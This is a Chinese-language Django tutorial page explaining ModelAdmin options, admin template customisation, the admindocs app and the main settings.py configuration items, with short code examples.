from django.utils.safestring import mark_safe

class PersonAdmin(admin.ModelAdmin):
    readonly_fields = ('address_report',)

    def address_report(self, instance):
        # assuming get_full_address() returns a list of strings for each line of the address and you want to separate each line by a linebreak
        return format_html_join( mark_safe('<br/>'), '{}', ((line,) for line in instance.get_full_address()),
        ) or mark_safe("<span class='errors'>I can't determine this address.</span>")

    address_report.short_description = "Address"

</textarea><pre>
29. ModelAdmin.save_as
默认值为False。如果设置为True那么右下角的"Save and add another"按钮将被替换成"Save as new",意思也变成保存为一个新的对象。

30. ModelAdmin.save_as_continue
默认值为True, 在保存新对象后跳转到该对象的修改页面,但是如果这时save_as_continue=False则会跳转到元素列表页面。

31. ModelAdmin.save_on_top
默认为False。设为True时页面的顶部会提供同样的一系列保存按钮。

32. ModelAdmin.search_fields
设置这个属性可以为admin的修改列表页面添加一个搜索框。
被搜索的字段可以是CharField或TextField文本类型,也可以通过双下划线进行ForeignKey或ManyToManyField的查询,格式为search_fields = ['foreign_key__related_fieldname'].

如果作者是博客的ForeignKey字段,下面的方式将通过作者的email地址来查询对应的博客,也就是email地址是查询值的作者所写的所有博客。
search_fields = ['user__email']

在搜索框里输入一些文本时Django会将文本分割成一个一个的关键字,并返回所有包含这些关键字的对象,每个关键词至少得是search_fields其中之一。
例如search_fields=['first_name', 'last_name'],当用户输入John lennon时Django将执行等同于下面的SQL语法WHERE子句:
WHERE (first_name ILIKE '%john%' OR last_name ILIKE '%john%') AND (first_name ILIKE '%lennon%' OR last_name ILIKE '%lennon%')

如果要执行更加严格的匹配或搜索可以使用一些元字符如"^",类似正则,代表从开头匹配。
例如search_fields=['^first_name','^last_name'],当用户输入"John lennon"时Django将执行等同于下面的SQL语法WHERE子句:
WHERE (first_name ILIKE 'john%' OR last_name ILIKE 'john%') AND (first_name ILIKE 'lennon%' OR last_name ILIKE 'lennon%')

也可以使用"="来进行区分大小写的并绝对相等的严格匹配
例如search_fields=['=first_name','=last_name'],当用户输入"John lennon"时Django将执行等同于下面的SQL语法WHERE子句:
WHERE (first_name ILIKE 'john' OR last_name ILIKE 'john') AND (first_name ILIKE 'lennon' OR last_name ILIKE 'lennon')

33. ModelAdmin.show_full_result_count
用于设置是否显示一个过滤后的对象总数的提示信息,例如"99 results (103 total)"。如果它被设置为False,那么显示的将是" 99 results (Show all)"。默认值为True,这将会对整个表进行一个count操作,在表很大的时候,可能会耗费一定的时间和资源。

34. ModelAdmin.view_on_site
控制是否在admin页面显示"View site"的链接,这个链接主要用于跳转到指定的URL页面。
属性的值可以是布尔值或某个调用。如果是True(默认值),对象的get_absolute_url()方法将被调用并生成rul。
如果模型有一个get_absolute_url()方法,但不想显示"View site"链接,只需要将view_on_site属性设置为False。
from django.contrib import admin
class PersonAdmin(admin.ModelAdmin):view_on_site = False

</pre>如果属性的值是一个调用,它将接收一个模型实例作为参数<textarea>
from django.contrib import admin
from django.urls import reverse

class PersonAdmin(admin.ModelAdmin):
    def view_on_site(self, obj):
        url = reverse('person-detail', kwargs={'slug': obj.slug})
        return 'https://example.com' + url

</textarea><pre>
【 定制admin整体界面 】
在项目的admin页面顶端都显示"Django administration",可通过Django的模板系统很方便的修改,Django的后台由自己驱动,且它的交互接口采用Django自己的模板系统。

定制项目模板
在工程目录内创建templates目录,模板可放在系统中任何Django能找到的位置,不过把模板放在工程内会带来很大便利,推荐这样做。
打开设置文件mysite/settings.py,在TEMPLATES设置中添加DIRS选项'DIRS': [os.path.join(BASE_DIR, 'templates')]
DIRS是一个文件系统目录的列表,是模板的搜索路径,当加载Django模板时会在DIRS中进行查找

模板的组织方式:就像静态文件一样,可以把所有的模板文件放在一个大模板目录内,这样它也能工作的很好。但属于特定应用的模板文件最好放在应用所属的模板目录如polls/templates,而不是整个工程的模板目录templates;因为这样每个应用才可以被方便和正确的重用。只有对整个项目有作用的模板文件才放在根目录的templates中,比如admin界面

在templates目录内创建admin目录,随后将存放Django默认模板的目录(django/contrib/admin/templates)内的模板文件admin/base_site.html复制到这个目录内,这个HTML文件来自Django源码,查看Django源码在系统的哪个位置可执行python3 -c "import django; print(django.__path__)"

接着用站点的名字替换文件内的{{ site_header|default:_('Django administration') }}(包含大括号),完成后的代码:
{% block branding %}
< h1 id="site-name">< a href="{% url 'admin:index' %}">投票站点管理界面< /a>< /h1>
{% endblock %}

这里使用的是硬编码,强行改名为"投票站点管理界面",但实际的项目中可使用django.contrib.admin.AdminSite.site_header属性方便的对这个页面title进行自定义。

所有的Django默认admin模板均可被复写。若要复写模板,像修改base_site.html一样修改其它文件,先将其从默认目录中拷贝到自定义目录,再做修改。

自定义应用的模板
DIRS默认是空的,Django是怎么找到默认的后台模板的？因为APP_DIRS被置为True,Django会自动在每个应用包内递归查找templates/ 子目录,django.contrib.admin也是一个应用
投票应用不是非常复杂,所以无需自定义后台模板。不过如果它变的更加复杂,需要修改Django的标准后台模板功能时,修改应用的模板会比工程的更加明智。这样在其它工程包含这个投票应用时,可以确保它总是能找到需要的自定义模板文件。

定制admin首页
默认情况下admin首页显示所有INSTALLED_APPS内并在admin应用中注册过的app,以字母顺序进行排序
要定制admin首页需要重写admin/index.html模板,就像前面修改base_site.html模板的方法一样,从源码目录拷贝到指定的目录内。编辑该文件,可以看到文件内使用了一个app_list模板变量。该变量包含了所有已经安装的Django应用。可以硬编码链接到指定对象的admin页面,使用任何认为好的方法用于替代这个app_list

</pre>

<h4>Admin文档生成器</h4><pre>
Django的admindocs应用可以从模型、视图、模板标签等地方获得文档内容

激活admindocs的步骤操作:
1、在INSTALLED_APPS内添加django.contrib.admindocs
2、在urlpatterns内添加url(r'^admin/doc/',include('django.contrib.admindocs.urls')),确保它处于r'^admin/'条目之前
3、安装Python的docutils模块(http://docutils.sf.net/)(pip3 install docutils)
4、可选:想使用admindocs的书签小工具,需要安装django.contrib.admindocs.middleware.XViewMiddleware。

如果上述步骤顺利完成,那么可以从admin界面访问doc界面,也可以直接访问/admin/doc

【 模型 】
在doc页面的模型部分列出了所有的模型,点击可以查看具体的字段等细节信息。信息主要来自字段的help_txt部分和模型方法的docstring部分

</pre>有用的帮助信息看起来是这个样子的<textarea>
class BlogEntry(models.Model):
    """
    Stores a single blog entry, related to :model:`blog.Blog` and
    :model:`auth.User`.
    """
    slug = models.SlugField(help_text="A short label, generally used in URLs.")
    author = models.ForeignKey(
        User,
        models.SET_NULL,
        blank=True, null=True,
    )
    blog = models.ForeignKey(Blog, models.CASCADE)
    ...

    def publish(self):
        """Makes the blog entry live on the site."""
        ...

</textarea><pre>
【 视图 】
站点内的每个URL都会在doc内享有一个页面,点击某个URL将会展示对应的视图信息。主要包括下面这些信息,请尽量丰富它们:
视图功能的简单描述
上下文环境,或者视图模块里的变量列表
视图内使用的模板

</pre><textarea>
from django.shortcuts import render
from myapp.models import MyModel

def my_view(request, slug):
    """
    Display an individual :model:`myapp.MyModel`.

    **Context**

    ``mymodel``
        An instance of :model:`myapp.MyModel`.

    **Template:**

    :template:`myapp/my_template.html`
    """
    context = {'mymodel': MyModel.objects.get(slug=slug)}
    return render(request, 'myapp/my_template.html', context)

</textarea><pre>
【 模板标签和过滤器 】
所有Django内置的或自定义的或第三方app提供的标签和过滤器都将在页面内展示

</pre>
</div>

<div id="django_setting">
<h4>django配置</h4><pre>
Django项目的设置文件位于项目同名目录下的settings.py,这个模块集合了整个项目方方面面的设置属性,是项目启动和提供服务的根本保证。
settings.py文件本质上是一个Python模块,带有模块级别的变量。

ALLOWED_HOSTS = ['www.example.com']
DEBUG = False  # 当DEBUG为False时必须设置ALLOWED_HOSTS的值
DEFAULT_FROM_EMAIL = 'webmaster@example.com'

配置settings.py时:
不允许出现Python层面的语法错误
可以使用普通的Python语法动态地设置,例如:MY_SETTING = [str(i) for i in range(30)]
可以从其它设置文件导入值

【 指定配置文件 】
使用Django时必须告诉它要使用哪个配置文件来启动服务,也就是给环境变量DJANGO_SETTINGS_MODULE赋值,这个值要使用Python路径的语法,例如mysite.settings,而不是操作系统的文件路径语法,被设置的配置文件mysite.settings应该在Python的导入查找路径中,否则要用绝对路径
默认是不需要设置这个变量的,直接启动项目就可以,但有时候就会有需要使用别的配置启动项目的情形
当使用django-admin命令时可设置临时环境变量,或者每次运行该工具时显式地指定配置文件。

Bash:
export DJANGO_SETTINGS_MODULE=mysite.settings
django-admin runserver

cmd:
set DJANGO_SETTINGS_MODULE=mysite.settings
django-admin runserver

使用--settings命令行参数可以手工指定:
django-admin runserver --settings=mysite.settings

在服务器环境中比如mod_wsgi网关接口,需要告诉WSGI准备使用哪个设置文件,这可以使用os.environ实现:
import os
os.environ['DJANGO_SETTINGS_MODULE'] = 'mysite.settings'

【 默认配置 】
Django的配置文件并不需要定义所有的选项,每个选项都有一个默认值,这些默认值位于django/conf/global_settings.py模块中。

Django加载配置的顺序:
从global_settings.py中加载默认配置;
从指定的配置文件中加载(通常是settings.py),如有必要则覆盖global_settings.py中的默认配置。

$ python3 manage.py diffsettings # 查看当前有哪些设置与默认的设置

【 在Django环境中使用settings 】
Django环境指的是要使用settings的模块(可以简单的理解为局域网内主机),必须是Django工作状态中能够链接的模块,不能是孤零零,额外的一个Python脚本(外部主机),这时可以通过导入django.conf.settings来使用配置文件
django.conf.settings不是一个模块,而是一个对象,所以不可以通过from django.conf.settings import DEBUG 单独导入每个配置项

from django.conf import settings
if settings.DEBUG: # Do something

$ python3 manage.py shell
>>> from django.conf import settings
>>> print([ e for e in dir(django.conf) if not e.startswith('_')])
['DEFAULT_CONTENT_TYPE_DEPRECATED_MSG', 'ENVIRONMENT_VARIABLE', 'FILE_CHARSET_DEPRECATED_MSG', 'ImproperlyConfigured', 'LazyObject', 'LazySettings', 'Path', 'RemovedInDjango30Warning', 'RemovedInDjango31Warning', 'Settings', 'SettingsReference', 'UserSettingsHolder', 'django', 'empty', 'global_settings', 'importlib', 'locale', 'os', 'settings', 'time', 'traceback', 'warnings']
>>> print([e for e in dir(django.conf.settings) if not startswith('_')])
['ABSOLUTE_URL_OVERRIDES', 'ADMINS', 'ALLOWED_HOSTS', 'APPEND_SLASH', 'AUTHENTICATION_BACKENDS', 'AUTH_PASSWORD_VALIDATORS', 'AUTH_USER_MODEL', 'BASE_DIR', 'CACHES', 'CACHE_MIDDLEWARE_ALIAS', 'CACHE_MIDDLEWARE_KEY_PREFIX', 'CACHE_MIDDLEWARE_SECONDS', 'CSRF_COOKIE_AGE', 'CSRF_COOKIE_DOMAIN', 'CSRF_COOKIE_HTTPONLY', 'CSRF_COOKIE_NAME', 'CSRF_COOKIE_PATH', 'CSRF_COOKIE_SAMESITE', 'CSRF_COOKIE_SECURE', 'CSRF_FAILURE_VIEW', 'CSRF_HEADER_NAME', 'CSRF_TRUSTED_ORIGINS', 'CSRF_USE_SESSIONS', 'DATABASES', 'DATABASE_ROUTERS', 'DATA_UPLOAD_MAX_MEMORY_SIZE', 'DATA_UPLOAD_MAX_NUMBER_FIELDS', 'DATETIME_FORMAT', 'DATETIME_INPUT_FORMATS', 'DATE_FORMAT', 'DATE_INPUT_FORMATS', 'DEBUG', 'DEBUG_PROPAGATE_EXCEPTIONS', 'DECIMAL_SEPARATOR', 'DEFAULT_CHARSET', 'DEFAULT_CONTENT_TYPE', 'DEFAULT_EXCEPTION_REPORTER_FILTER', 'DEFAULT_FILE_STORAGE', 'DEFAULT_FROM_EMAIL', 'DEFAULT_INDEX_TABLESPACE', 'DEFAULT_TABLESPACE', 'DISALLOWED_USER_AGENTS', 'EMAIL_BACKEND', 'EMAIL_HOST', 'EMAIL_HOST_PASSWORD', 'EMAIL_HOST_USER', 'EMAIL_PORT', 'EMAIL_SSL_CERTFILE', 'EMAIL_SSL_KEYFILE', 'EMAIL_SUBJECT_PREFIX', 'EMAIL_TIMEOUT', 'EMAIL_USE_LOCALTIME', 'EMAIL_USE_SSL', 'EMAIL_USE_TLS', 'FILE_CHARSET', 'FILE_UPLOAD_DIRECTORY_PERMISSIONS', 'FILE_UPLOAD_HANDLERS', 'FILE_UPLOAD_MAX_MEMORY_SIZE', 'FILE_UPLOAD_PERMISSIONS', 'FILE_UPLOAD_TEMP_DIR', 'FIRST_DAY_OF_WEEK', 'FIXTURE_DIRS', 'FORCE_SCRIPT_NAME', 'FORMAT_MODULE_PATH', 'FORM_RENDERER', 'IGNORABLE_404_URLS', 'INSTALLED_APPS', 'INTERNAL_IPS', 'LANGUAGES', 'LANGUAGES_BIDI', 'LANGUAGE_CODE', 'LANGUAGE_COOKIE_AGE', 'LANGUAGE_COOKIE_DOMAIN', 'LANGUAGE_COOKIE_NAME', 'LANGUAGE_COOKIE_PATH', 'LOCALE_PATHS', 'LOGGING', 'LOGGING_CONFIG', 'LOGIN_REDIRECT_URL', 'LOGIN_URL', 'LOGOUT_REDIRECT_URL', 'MANAGERS', 'MEDIA_ROOT', 'MEDIA_URL', 'MESSAGE_STORAGE', 'MIDDLEWARE', 'MIGRATION_MODULES', 'MONTH_DAY_FORMAT', 'NUMBER_GROUPING', 'PASSWORD_HASHERS', 'PASSWORD_RESET_TIMEOUT_DAYS', 'PREPEND_WWW', 'ROOT_URLCONF', 'SECRET_KEY', 'SECURE_BROWSER_XSS_FILTER', 'SECURE_CONTENT_TYPE_NOSNIFF', 'SECURE_HSTS_INCLUDE_SUBDOMAINS', 'SECURE_HSTS_PRELOAD', 'SECURE_HSTS_SECONDS', 'SECURE_PROXY_SSL_HEADER', 'SECURE_REDIRECT_EXEMPT', 'SECURE_SSL_HOST', 'SECURE_SSL_REDIRECT', 'SERVER_EMAIL', 'SESSION_CACHE_ALIAS', 'SESSION_COOKIE_AGE', 'SESSION_COOKIE_DOMAIN', 'SESSION_COOKIE_HTTPONLY', 'SESSION_COOKIE_NAME', 'SESSION_COOKIE_PATH', 'SESSION_COOKIE_SAMESITE', 'SESSION_COOKIE_SECURE', 'SESSION_ENGINE', 'SESSION_EXPIRE_AT_BROWSER_CLOSE', 'SESSION_FILE_PATH', 'SESSION_SAVE_EVERY_REQUEST', 'SESSION_SERIALIZER', 'SETTINGS_MODULE', 'SHORT_DATETIME_FORMAT', 'SHORT_DATE_FORMAT', 'SIGNING_BACKEND', 'SILENCED_SYSTEM_CHECKS', 'STATICFILES_DIRS', 'STATICFILES_FINDERS', 'STATICFILES_STORAGE', 'STATIC_ROOT', 'STATIC_URL', 'TEMPLATES', 'TEST_NON_SERIALIZED_APPS', 'TEST_RUNNER', 'THOUSAND_SEPARATOR', 'TIME_FORMAT', 'TIME_INPUT_FORMATS', 'TIME_ZONE', 'USE_I18N', 'USE_L10N', 'USE_THOUSAND_SEPARATOR', 'USE_TZ', 'USE_X_FORWARDED_HOST', 'USE_X_FORWARDED_PORT', 'WSGI_APPLICATION', 'X_FRAME_OPTIONS', 'YEAR_MONTH_FORMAT', 'is_overridden']
>>> settings.TIME_ZONE
'Asia/Shanghai'

不要在Django项目运行时更改设置,例如不要在视图中这样做:
from django.conf import settings
settings.DEBUG = True   # 不要这么做

注意安全
因为settings.py经常会包含敏感的信息,例如管理员、远程主机、数据库的用户名或密码,应该尽一切可能来限制对它的访问,例如修改它的文件权限使得只有你和Web服务器使用者可以读取它。

添加自己的配置项
如果要添加自己的配置项需遵循以下准则:
配置项名称必须全为大写。
不要使用一个已经存在的设置

【 自定义默认设置 】
如果想让默认值来自其它地方而不是django.conf.global_settings,可以传递一个提供默认设置的模块或类作为default_settings参数或第一个位置参数给configure()方法调用。

在下面的示例中,默认的设置来自myapp_defaults,并且单独设置DEBUG为True,而不论它在myapp_defaults中的值是什么:

from django.conf import settings
from myapp import myapp_defaults
settings.configure(default_settings=myapp_defaults, DEBUG=True)
settings.configure(myapp_defaults, DEBUG=True)

正常情况下还是不要用这种方式覆盖默认值,Django的默认配置文件还是很可靠的,可以安全地使用它们。 如果使用自己写的默认模块,它将完全取代Django的默认模块,必须指定每个可能用到的配置项的值

configure()或DJANGO_SETTINGS_MODULE只能用一个,并且只能用一次,不可以两个都用和都不用
如果没有设置DJANGO_SETTINGS_MODULE环境变量,必须使用configure()方法来加载配置
如果没有设置DJANGO_SETTINGS_MODULE,也没有调用configure(),首次调用配置文件时Django将引发一个ImportError异常
如果设置了DJANGO_SETTINGS_MODULE,并访问了一下设置,然后又调用configure(),Django将引发一个RuntimeError异常,表示已经有配置,不要重复配置。

有个属性正好可以用于种情况,防止出现异常:
from django.conf import settings
if not settings.configured: settings.configure(myapp_defaults, DEBUG=True)

【 外部脚本调用Django环境:django.setup() 】
如果使用外部脚本加载一些Django模板或使用ORM来获取一些数据,除了配置settings模块之外,还需要一个步骤:在设置DJANGO_SETTINGS_MODULE或调用configure()之后还需要调用django.setup(),只有真正独立的外部脚本才需要调用django.setup(),当处于服务器调用环境或通过django-admin调用Django将自动加载环境。

</pre><textarea>
import django
from django.conf import settings
from myapp import myapp_defaults
settings.configure(default_settings=myapp_defaults, DEBUG=True)
django.setup()

# 现在可以访问Django项目内部的模块了
from myapp import models

# django.setup()只能调用一次,尽量使用下面的方式来防止重复调用:
if __name__ == '__main__':
    import django
    django.setup()

</textarea><pre>
【 核心配置项 】
settings.py是使用django-admin startproject xxx命令时额外创建的

1. ADMINS 默认值:[]
所有获得代码错误通知的人的邮件地址列表,当DEBUG=False且一个视图引发异常时Django会给这个列表里的人发一封含有完整异常信息的电子邮件,列表的每项都是(全名,电子邮件地址)的元组
ADMINS = [('John', 'john@example.com'), ('Mary', 'mary@example.com')]

2. ALLOWED_HOSTS 默认值:[]
该配置项列表中包含Django站点可以为之提供服务的主机/域名,即哪些主机或IP能够访问Django服务器,列表里的所有元素是共同存在的关系,不存在冲突、优先级和排斥的关系。

列表中的值可以是localhost、www.example.com或.example.com形式的域名。
也可以是IP地址,比如:137.2.4.1、192.168.1.1、0.0.0.0、127.0.0.1
还可以是通配符'*',表示所有外部主机都可以访问Django,但这种情况具有安全风险,在线上环境不要使用。ALLOWED_HOSTS = ['*']
对于0.0.0.0,表示局域网内的主机都可以访问Django。

当DEBUG为True和ALLOWED_HOSTS为空时默认相当于配置:['localhost', '127.0.0.1', '[:: 1]']。

3. APPEND_SLASH 默认值:True
当设定为True时如果请求的URL没有匹配到URLconf里面的任何一条URL路由设置并且没有以/结束,该请求将重定向到以请求URL加/的URL地址,重定向有可能导致POST提交的数据丢失。即写url时忘记了在最后添加一个斜杠,Django会默认加上,请尽量保持默认值
APPEND_SLASH依赖CommonMiddleware中间件

4. DATABASES 默认值: {}
该配置项包含Django项目使用的所有数据库的设置,这是一个嵌套字典,必须配置一个default数据库及可选的任意数量的其它数据库
最简单的配置是使用Python和Django内置的SQLite数据库

</pre><textarea>
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': 'mydatabase',
        # 或者'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),
    }
}

</textarea><pre>
由于SQLite数据库通常就在Django项目本地根目录下,以一个文件的形式存在,没有用户名、密码、IP、port的问题,所以配置简单;当连接其他数据库后端如MySQL、Oracle或PostgreSQL必须提供更多的连接参数

DATABASES的内部配置项:

ATOMIC_REQUESTS
默认False,原子性事务请求。

AUTOCOMMIT
默认True,自动提交。

ENGINE
默认''(空字符串),指定使用的数据库后端,内建的数据库后端名称有:
'django.db.backends.postgresql'
'django.db.backends.mysql'
'django.db.backends.sqlite3'
'django.db.backends.oracle'

HOST
默认''(空字符串表示localhost),数据库所在的主机,值可以是主机名、IP地址和socket路径,SQLite不需要配置这项。
如果其值以斜杠('/')开头并使用的是MySQL,MySQL将通过Unix socket连接,如"HOST": '/var/run/mysql'

NAME
默认'',使用的数据库名称,对于SQLite是数据库文件的完整路径。指定路径时请始终使用前向的斜杠,即使在Windows上(例如C:/homes/user/mysite/sqlite3.db),
对于MySQL等数据库,NAME指的是数据库系统中的具体某个database,Django没有能力自动在MySQL中创建数据库,只能通过模型创建数据表,所以需要通过各种数据客户端,在MySQL中提前创建好Django项目需要的数据库,使用命令CREATE DATABASE mysite CHARACTER SET utf8;

CONN_MAX_AGE
默认0,数据库连接的存活时间,以秒为单位。0表示在每个请求结束时关闭数据库连接,None表示无限的持久连接。

OPTIONS
默认{},连接数据库时使用的额外参数,可用的参数与数据库后端有关。

PASSWORD
默认'',连接数据库时使用的密码,SQLite不需要这项。

PORT
默认'',连接数据库时使用的端口,空字符串表示默认的端口,MySQL一般是3306,SQLite不需要这项

TIME_ZONE
默认None,数据库中使用的时区。

USER
默认'',连接数据库时使用的用户名,SQLite不需要这项。

TEST
默认{},测试数据库用的配置。

</pre>测试数据库配置的示例<textarea>
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'USER': 'mydatabaseuser',
        'NAME': 'mydatabase',
        'TEST': {
            'NAME': 'mytestdatabase',
        },
    },
}

</textarea><pre>
5. DATE_FORMAT
默认'N j, Y' (例如:Feb. 4, 2003),系统中日期字段的默认显示格式。

6. DATE_INPUT_FORMATS
默认值:
[
    '%Y-%m-%d', '%m/%d/%Y', '%m/%d/%y', # '2006-10-25', '10/25/2006', '10/25/06'
    '%b %d %Y', '%b %d, %Y',            # 'Oct 25 2006', 'Oct 25, 2006'
    '%d %b %Y', '%d %b, %Y',            # '25 Oct 2006', '25 Oct, 2006'
    '%B %d %Y', '%B %d, %Y',            # 'October 25 2006', 'October 25, 2006'
    '%d %B %Y', '%d %B, %Y',            # '25 October 2006', '25 October, 2006'
]
日期字段中输入数据时将能够被接受的格式列表。格式将按顺序尝试,使用第一个有效的格式。

7. DATETIME_FORMAT
默认'N j, Y, P' (例如Feb. 4, 2003, 4 p.m.),系统中显示datetime字段的默认格式。

8. DATETIME_INPUT_FORMATS
默认值:
[
    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'
    '%Y-%m-%d',              # '2006-10-25'
    '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'
    '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'
    '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'
    '%m/%d/%Y',              # '10/25/2006'
    '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'
    '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'
    '%m/%d/%y %H:%M',        # '10/25/06 14:30'
    '%m/%d/%y',              # '10/25/06'
]
在datetime字段中输入数据时将被接受的格式列表。格式将按顺序尝试,使用第一个有效的格式

9. DEBUG
默认False,打开/关闭调试模式,设置为True打开了调试模式方便开发和测试,线上部署网站时务必设置为False。
如果DEBUG为False还需要正确设置ALLOWED_HOSTS及静态文件,错误设置将导致对所有的请求返回"Bad Request (400)"
调试模式下可显示错误页面的细节,若应用产生了一个异常,Django会显示追溯细节,包括许多环境变量的元数据,比如所有当前定义的Django设置。
作为安全考虑,调试信息中不会列出包含下列关键字的配置项的内容,'API'、'KEY'、'PASS'、'SECRET'、'SIGNATURE'、'TOKEN'

10. DEFAULT_CHARSET
默认'utf-8',HttpResponse响应对象的默认字符集。

11. DEFAULT_CONTENT_TYPE
默认'text/html',HttpResponse对象的默认内容类型。

12. DEFAULT_FROM_EMAIL
默认'webmaster@localhost',默认的电子邮件发送地址,即发送方。

13. DISALLOWED_USER_AGENTS
默认[],这是一个编译好了的正则表达式对象的列表,代表哪些不允许访问任何页面的User-Agent字符串,常用于对付机器人和网络蜘蛛,需要CommonMiddleware中间件支持。

14. EMAIL_BACKEND
默认' django.core.mail.backends.smtp.EmailBackend ',用于发送邮件的后端。

15. EMAIL_FILE_PATH
默认值未指定,邮件后端保存输出文件时使用的目录。

16. EMAIL_HOST
默认'localhost',发送邮件使用的主机。

17. EMAIL_HOST_PASSWORD
默认'',EMAIL_HOST的SMTP服务器使用的密码。

18. EMAIL_HOST_USER
默认'',EMAIL_HOST的SMTP服务器使用的用户名。

19. EMAIL_PORT
默认25,EMAIL_HOST的SMTP服务器使用的端口。

20. EMAIL_SUBJECT_PREFIX
默认'[Django] ',使用django.core.mail.mail_admins或django.core.mail.mail_managers发送的电子邮件的主题行前缀。

21. EMAIL_USE_TLS
默认False,是否使用TLS(安全)与SMTP服务器连接。用于显式TLS连接,通常在端口587上。

22. EMAIL_USE_SSL
默认False,在与SMTP服务器通信时是否使用隐式TLS(安全)连接。在大多数电子邮件文档中此类型的TLS连接称为SSL。 它通常在端口465上使用,qq邮箱需要使用ssl安全链接在465端口上
EMAIL_USE_TLS与EMAIL_USE_SSL是互斥的,因此只能将其中一个设置设置为True。

23. EMAIL_SSL_CERTFILE
默认None,如果EMAIL_USE_SSL或EMAIL_USE_TLS为True则可以选择指定要用于SSL连接的PEM格式的证书链文件的路径。

24. EMAIL_SSL_KEYFILE
默认None,如果EMAIL_USE_SSL或EMAIL_USE_TLS为True可以选择指定要用于SSL连接的PEM格式的私钥文件的路径。

25. EMAIL_TIMEOUT
默认None,邮件发送超时时间。

26. FILE_CHARSET
默认'utf-8',从磁盘读取文件时使用的字符编码,包括模板文件和初始SQL数据文件。

27. INSTALLED_APPS
默认[],当前Django项目中启用的app列表,每个元素应该是一个字符串格式的Python的点分路径
项目内每个启用的app包括Django内置的contrib都必须在这个列表里注册,否则创建数据表、调用功能等等都无法进行。

</pre><textarea>
INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'app1',
    'app2',
]

</textarea><pre>
28. LANGUAGE_CODE
默认'en-us',当前项目所使用的语言,默认为英语,汉语是zh-hans,USE_I18N必须设置为True才能使LANGUAGE_CODE生效。

29. LANGUAGES
默认值:所有可用语言的列表,该配置项表示可用的语言种类,(语言代码,语言名称)两元组列表,例如('ja', 'Japanese')。
如果自定义LANGUAGES设置,可以使用ugettext_lazy()函数将语言名称标记为翻译字符串。
from django.utils.translation import ugettext_lazy as _
LANGUAGES = [('de', _('German')), ('en', _('English'))]

30. LOCALE_PATHS
默认[],Django查找翻译文件的目录列表,Django将在这些路径中查找包含实际翻译文件的目录
LOCALE_PATHS = ['/home/www/project/common_files/locale', '/var/local/translations/locale']

31. LOGGING
默认值:日志配置字典,日志配置信息。

32. LOGGING_CONFIG
默认值:'logging.config.dictConfig',用于在Django项目中配置日志记录的可调用项的路径。

33. MEDIA_ROOT
默认'',用户上传的文件所在目录的,文件系统绝对路径如"/var/www/example.com/media/",MEDIA_ROOT和STATIC_ROOT必须设置为不同的值。

34. MEDIA_URL
默认'',MEDIA_URL指向MEDIA_ROOT所指定的media文件,用来管理保存的文件,该URL设置为非空值时必须以斜杠"/"结束。
若打算在模版中使用{{ MEDIA_URL }},必须在TEMPLATES的context_processors设置中添加django.template.context_processors.media。
MEDIA_URL和STATIC_URL必须设置为不同的值。

35. MIDDLEWARE
默认None,要使用的中间件列表。Django-admin命令创建的新项目中settings.py文件里默认会为MIDDLEWARE配置项添加一系列Django内置的中间件,保持它不变即可

36. ROOT_URLCONF
默认:未指定,一个字符串,表示根URLconf的完整Python导入路径,例如ROOT_URLCONF = 'mysite.urls'
每个请求都可以覆盖它,通过设置HTTP请求HttpRequest对象的urlconf属性

37. SECRET_KEY
默认'',当前Django项目实例的密钥,用于提供cryptographic签名,是一个唯一的且不可预测的值,如果未设置SECRET_KEY,Django将无法启动
通过django-admin startproject xxx命令创建的项目会在settings.py中添加随机生成的SECRET_KEY。
SECRET_KEY = '5^+1s(3u)=ni$h-#_4qqj3ery6jj(wm1%bx%h!xbh&#d9n3sz#'

38. TEMPLATES
默认[],Django模板系统相关的配置。列表中每一项都是一个字典类型数据,可以配置模板不同的功能。

以下选项适用于所有后端。
BACKEND:
默认:未指定,要使用的模板后端,内置模板后端有:
'django.template.backends.django.DjangoTemplates'
'django.template.backends.jinja2.Jinja2'
通过将BACKEND设置为完全限定路径(即'mypackage.whatever.Backend')可以使用第三方提供的模板后端。

NAME:
此特定模板引擎的别名,一个标识符,用于在某些情况下指定选择引擎进行渲染。别名在所有已配置的模板引擎中必须是唯一的。
当没有提供时,如果后端是'mypackage.whatever.Backend',则其默认名称为'whatever'。

DIRS:
默认[],搜索模版的路径列表。搜索引擎会按照列表的排列顺序查找template资源文件。短路算法,找到即退出,不再往下找。

APP_DIRS
默认False,Templates搜索引擎是否应该在已安装的app中查找Template源文件。建议保持打开,即设置为True
由django-admin startproject xxx命令创建的Django项目,其settings.py文件中'APP_DIRS'已经设置为True了。

OPTIONS:
默认值:{},传递给模板后端的额外参数,可用参数因模板后端而异。

39. TIME_ZONE
默认'America/Chicago',时区设置,设为中国时间:TIME_ZONE = 'Asia/Shanghai'
这个配置项的值不一定要和服务器的时区一致,例如一个服务器可上可能有多个Django站点,每个站点都有一个单独的时区设置。
当USE_TZ为False时它将成为Django存储所有日期和时间数据时使用的时区。 当USE_TZ为True时它是Django显示模板中的时间,解释表单中的日期,使用的时区,所以通常都将USE_TZ同时设置为False
在Windows环境中Django不能可靠地交替其它时区,如果在Windows上运行Django,TIME_ZONE必须设置为与系统时区一致。

40. USE_I18N
默认True,指定是否开启Django的翻译系统。如果设置为False则Django会做一些优化,不去加载翻译机制。
由django-admin startproject xxx命令创建的Django项目,其settings.py文件中'USE_I18N'已经设置为True了。

41. USE_L10N
默认False,用于决定是否开启数据本地化。如果此设置为True则Django将使用当前语言环境的格式显示数字和日期。
由django-admin startproject xxx命令创建的Django项目,其settings.py文件中'USE_L10N'已经设置为True了。

42. USE_TZ
默认False,用来指定是否使用指定的时区(TIME_ZONE)的时间。若为True则Django会使用内建的时区的时间,否则Django将会使用本地的时间。
由django-admin startproject xxx命令创建的Django项目,其settings.py文件中'USE_TZ'已经设置为True了。
